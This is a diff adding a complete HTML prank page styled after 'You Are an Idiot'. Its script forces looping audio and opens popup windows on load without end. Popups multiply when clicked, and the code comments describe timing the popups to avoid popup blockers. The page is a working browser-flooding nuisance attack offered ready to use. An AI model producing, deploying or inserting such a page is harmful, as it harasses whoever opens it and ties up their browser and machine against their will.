@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>YOU ARE AN IDIOT</title>
+    <style>
+        body {
+            margin: 0; padding: 0; background: black; color: lime;
+            font-family: sans-serif; text-align: center; overflow: hidden;
+        }
+        h1 {
+            font-size: 3.8em;
+            margin: 8vh 0 10px;
+            text-shadow: 0 0 25px lime;
+            animation: blink 0.4s infinite alternate;
+        }
+        @keyframes blink { from { opacity: 0.6; } to { opacity: 1; } }
+        .idiot-img {
+            max-width: 90vw;
+            max-height: 65vh;
+            width: auto;
+            height: auto;
+            margin: 10px auto;
+            display: block;
+            border: 8px solid lime;
+            box-shadow: 0 0 35px lime;
+        }
+        p { font-size: 1.6em; margin: 15px; }
+    </style>
+</head>
+<body>
+    <h1>YOU ARE AN IDIOT</h1>
+    <img src="https://raw.githubusercontent.com/hoto17296/youareanidiot/master/youareanidiot.gif" 
+         class="idiot-img" alt="You are an idiot">
+    <p>開いたらすぐに音とポップアップが始まるよ...（ブロック許可してね）</p>
+
+    <audio id="idiotSound" preload="auto" loop>
+        <source src="https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+        const sound = document.getElementById('idiotSound');
+        let count = 1;
+
+        function playSound() {
+            sound.currentTime = 0;
+            sound.play().catch(() => {
+                console.log("音再生待機中...");
+            });
+        }
+
+        function spawnPopup() {
+            const width = 460;
+            const height = 420;
+            const left = Math.random() * (screen.availWidth - width - 180) + 90;
+            const top = Math.random() * (screen.availHeight - height - 180) + 90;
+
+            const popup = window.open('', '_blank', 
+                `width=${width},height=${height},left=${Math.floor(left)},top=${Math.floor(top)},resizable=yes,scrollbars=no,menubar=no,toolbar=no,status=no`
+            );
+
+            if (popup) {
+                popup.document.write(`
+                    <!DOCTYPE html>
+                    <html>
+                    <head>
+                        <meta charset="UTF-8">
+                        <title>YOU ARE AN IDIOT ×${count}</title>
+                        <style>
+                            body { margin:0; padding:0; background:black; color:lime; text-align:center; overflow:hidden; }
+                            h1 { font-size:2.9em; margin:8vh 0 10px; text-shadow:0 0 20px lime; animation: blink 0.5s infinite alternate; }
+                            .idiot-img { max-width:90vw; max-height:65vh; width:auto; height:auto; margin:10px auto; display:block; border:7px solid lime; box-shadow:0 0 30px lime; }
+                            @keyframes blink { from { opacity: 0.7; } to { opacity: 1; } }
+                        </style>
+                    </head>
+                    <body>
+                        <h1>YOU ARE AN IDIOT</h1>
+                        <img src="https://raw.githubusercontent.com/hoto17296/youareanidiot/master/youareanidiot.gif" class="idiot-img" alt="idiot">
+                        <p>クリックでさらに増える！</p>
+                        <audio id="sound" preload="auto" loop>
+                            <source src="https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3" type="audio/mpeg">
+                        </audio>
+                        <script>
+                            const s = document.getElementById('sound');
+                            function play() { s.currentTime = 0; s.play().catch(() => {}); }
+                            window.onload = () => {
+                                play();
+                                setTimeout(play, 200);
+                            };
+                            document.addEventListener('click', () => {
+                                play();
+                                if (window.opener && typeof window.opener.spawnPopup === 'function') {
+                                    window.opener.spawnPopup();
+                                }
+                            });
+                        <\/script>
+                    </body>
+                    </html>
+                `);
+                popup.document.close();
+                count++;
+            }
+        }
+
+        // ページ読み込み時の処理（できる限り早く）
+        window.onload = () => {
+            // 音をできるだけ早く試行（複数回）
+            playSound();
+            setTimeout(playSound, 100);
+            setTimeout(playSound, 300);
+            setTimeout(playSound, 600);
+
+            // 開いた直後に早いタイミングでポップアップを連発（ブロックされにくいよう短い間隔）
+            setTimeout(() => { spawnPopup(); }, 400);
+            setTimeout(() => { spawnPopup(); }, 700);
+            setTimeout(() => { spawnPopup(); }, 1100);
+            setTimeout(() => { spawnPopup(); }, 1600);
+
+            // 自動増殖（少し早め）
+            setTimeout(() => {
+                setInterval(() => {
+                    spawnPopup();
+                }, 650);
+            }, 2500);
+
+            // クリック時の保険（10個 + 音強制）
+            document.addEventListener('click', () => {
+                playSound();
+                for (let i = 0; i < 10; i++) {
+                    setTimeout(spawnPopup, i * 30);
+                }
+            });
+
+            // 音が止まらない保険
+            setInterval(() => {
+                if (sound.paused) playSound();
+            }, 900);
+        };
+    </script>
+</body>
+</html>
